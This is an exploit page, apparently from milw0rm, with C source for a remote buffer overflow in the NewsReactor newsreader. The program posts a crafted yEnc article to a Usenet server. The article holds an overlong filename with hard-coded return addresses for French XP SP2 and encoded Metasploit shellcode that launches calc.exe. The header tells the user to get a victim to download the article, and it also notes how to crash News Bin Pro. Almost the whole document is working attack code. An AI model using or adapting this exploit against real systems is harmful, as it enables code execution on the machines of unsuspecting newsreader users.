<html><head><title>NewsReactor 20070220 Article Grabbing Remote BoF Exploit (2)</title></head><pre>/*********************************************************************************
*         NewsReactor 20070220 Article Grabbing Remote Buffer Overflow           *
*                                Exploit 2                                       *
*                                                                                *
*                                                                                *
* Check the other advisory for technical details.                                *
*                                                                                *
* This exploit connects to your newsgroups provider and posts a crafted article. *
*                                                                                *
* Ask your victim to grab it to trigger the bug and execute calc.exe.            *
* Return address should work on XP SP2 FR.                                       *
* Should fail on english systems cause I took the first return address I got =D. *
* Have Fun!                                                                      *
*                                                                                *
* Tested against WIN XP SP2 FR                                                   *
* Coded and Discovered by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;                     *
*                                                                                *
* Note: change evilbuff to crash News Bin Pro 4.32. 800 'A' should be enough.    *
*********************************************************************************/


#include &quot;winsock2.h&quot;
#include &quot;stdio.h&quot;
#include &quot;stdlib.h&quot;
#pragma comment(lib, &quot;ws2_32.lib&quot;)


/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com */
/* 0x00 0x0b 0x0c 0x0a 0x0d 0x0e 0x0f 0x09 0x20 0x22 0x7C */
char calcshellcode[] =
&quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot;
&quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot;
&quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot;
&quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot;
&quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot;
&quot;\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x37&quot;
&quot;\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x48&quot;
&quot;\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x58&quot;
&quot;\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c&quot;
&quot;\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e&quot;
&quot;\x46\x4f\x4b\x53\x46\x35\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x58&quot;
&quot;\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x44&quot;
&quot;\x4b\x48\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x48&quot;
&quot;\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x43&quot;
&quot;\x42\x4c\x46\x56\x4b\x48\x42\x34\x42\x53\x45\x48\x42\x4c\x4a\x47&quot;
&quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x37\x4e\x51\x4d\x4a&quot;
&quot;\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b&quot;
&quot;\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x56\x4e\x53\x4f\x35\x41\x53&quot;
&quot;\x48\x4f\x42\x46\x48\x35\x49\x58\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot;
&quot;\x42\x35\x4a\x56\x50\x47\x4a\x4d\x44\x4e\x43\x57\x4a\x56\x4a\x59&quot;
&quot;\x50\x4f\x4c\x58\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x56\x41\x56&quot;
&quot;\x4e\x56\x43\x36\x50\x42\x45\x56\x4a\x47\x45\x36\x42\x30\x5a&quot;;

int main(int argc, char* argv[])
{
	struct hostent *he;
	struct sockaddr_in sock_addr;
	WSADATA wsa;
	int nntpsock;
	char recvbuff[500];
	char buffer[100];
	char authuser[]=&quot;AUTHINFO USER %s\r\n&quot;;
	char authpass[]=&quot;AUTHINFO PASS %s\r\n&quot;;
	char evilbuff[10000];
	char *user=0,*pass=0,*subject,*group,*author;
	int i=2;

	WSACleanup();
	WSAStartup(MAKEWORD(2,0),&amp;wsa);

	if (argc&lt;5) {
		printf(&quot;[+] NewsReactor Article Grabbing Remote Buffer Overflow\n&quot;);
		printf(&quot;[+] Coded and Discovered by Marsu &lt;Marsupilamipowa@hotmail.fr&gt;\n&quot;);
		printf(&quot;[+] Usage: %s Newsserver [-u User] [-p Pass] Group Subject Author\n&quot;,argv[0]);
		printf(&quot;[+] example:\n    %s news.giganews.com -i user -p pass alt.binaries.dvdr boomboom superman\n&quot;,argv[0]);
		return 0;
	}
	
	if (strstr(argv[i],&quot;-u&quot;)) {
		i++;
		user=argv[i];
		i++;
	}
	if (strstr(argv[i],&quot;-p&quot;)) {
		i++;
		pass=argv[i];
		i++;
	}
	group=argv[i++];
	subject=argv[i++];
	author=argv[i];
	
	printf(&quot;%s \n%s \n%s \n&quot;,group,subject,author);
	if ((he=gethostbyname(argv[1])) == NULL) { 
		printf(&quot;Failed\n[-] Could not init gethostbyname\n&quot;);
		return 1;
	}
	if ((nntpsock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		printf(&quot;Failed\n[-] Socket error\n&quot;);
		return 1;
	}

	sock_addr.sin_family = PF_INET;
	sock_addr.sin_port = htons(119);
	sock_addr.sin_addr = *((struct in_addr *)he-&gt;h_addr);
	memset(&amp;(sock_addr.sin_zero), '\0', 8);
	if (connect(nntpsock, (struct sockaddr *)&amp;sock_addr, sizeof(struct sockaddr)) == -1) {
		printf(&quot;[-] Unable to connect\n&quot;);
		return 1;
	}
	printf(&quot;[+] Connected to %s\n&quot;,argv[1]);
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf(&quot;-&gt; %s&quot;,recvbuff);
	
	if (user!=0) {
		memset(buffer,0,100);
		sprintf(buffer,authuser,user);
		send(nntpsock,buffer,strlen(buffer),0);
		printf(&quot;[+] USER %s\n&quot;,user);
		memset(recvbuff,'\0',500);
		recv(nntpsock, recvbuff, 500, 0);
		printf(&quot;-&gt; %s&quot;,recvbuff);
	}
	
	if (pass!=0) {
		memset(buffer,0,100);
		sprintf(buffer,authpass,pass);
		send(nntpsock,buffer,strlen(buffer),0);
		printf(&quot;[+] PASS %s\n&quot;,pass);
		memset(recvbuff,'\0',500);
		recv(nntpsock, recvbuff, 500, 0);
		printf(&quot;-&gt; %s&quot;,recvbuff);
	}
	
	send(nntpsock,&quot;MODE READER\r\n&quot;,strlen(&quot;MODE READER\r\n&quot;),0);
	printf(&quot;[+] MODE READER\n&quot;);
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf(&quot;-&gt; %s&quot;,recvbuff);
	
	send(nntpsock,&quot;POST\r\n&quot;,strlen(&quot;POST\r\n&quot;),0);
	printf(&quot;[+] POST\n&quot;);
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf(&quot;-&gt; %s&quot;,recvbuff);
	
char header[]=
&quot;From: %s &lt;%s@blabla.com&gt;\r\n&quot;
&quot;Newsgroups: %s\r\n&quot;
&quot;Subject: %s (1/1) \r\n&quot;
&quot;X-Newsreader: blabla\r\n\r\n&quot;;

char fileheader[]=&quot;=ybegin part=1 line=128 size=127 name=&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;\xD6\xE6\xE3\x77&quot; //jmp EDI in advapi32.dll XP SP2 FR.
&quot;\xD6\xE6\xE3\x77&quot; //ugly but we don't know where we land...
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot;
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot;
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot;
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot;
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot; 
&quot;\xD6\xE6\xE3\x77&quot;
&quot;AAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
&quot;AAAAAAAA&quot;;

char file[]=&quot;=ypart begin=1 end=127\r\n&quot;  //encoded file. Doesnt matter but works!
&quot;vkJmyvvsxoJkJno}J..J\\74n.ncJ.Q......è7474...è.JWJ[X]]Jç........èJ^Y]74ù..JWJk.....ùJ\\XZVJê.....ùJ\\XZ74}..ùJ....èùJdJp.....ù\r\n&quot;;
char fileend[]=&quot;=yend size=127 part=1 pcrc32=d4f19f0f\r\n&quot;;
char postend[]=&quot;\r\n.\r\n&quot;;


	memset(evilbuff,0,10000);
	sprintf(evilbuff,header,author,author,group,subject);
	printf(&quot;[+] Message header:\n%s&quot;,evilbuff);
	send(nntpsock,evilbuff,strlen(evilbuff),0);
	Sleep(100);

	memset(evilbuff,0,10000);
	memcpy(evilbuff,fileheader,strlen(fileheader));
	memcpy(evilbuff+strlen(fileheader),calcshellcode,strlen(calcshellcode));
	memcpy(evilbuff+strlen(fileheader)+strlen(calcshellcode),&quot;\r\n\0&quot;,3);
	send(nntpsock,evilbuff,strlen(evilbuff),0);
	Sleep(100);

	send(nntpsock,file,strlen(file),0);
	Sleep(100);
	send(nntpsock,fileend,strlen(fileend),0);
	Sleep(100);
	send(nntpsock,postend,strlen(postend),0);
	Sleep(100);
	
	memset(recvbuff,'\0',500);
	recv(nntpsock, recvbuff, 500, 0);
	printf(&quot;-&gt; %s&quot;,recvbuff);

	printf(&quot;[+] Article posted. Have fun\n&quot;);
	Sleep(1000);
	return 0;
}

// milw0rm.com [2007-03-12]</pre></html>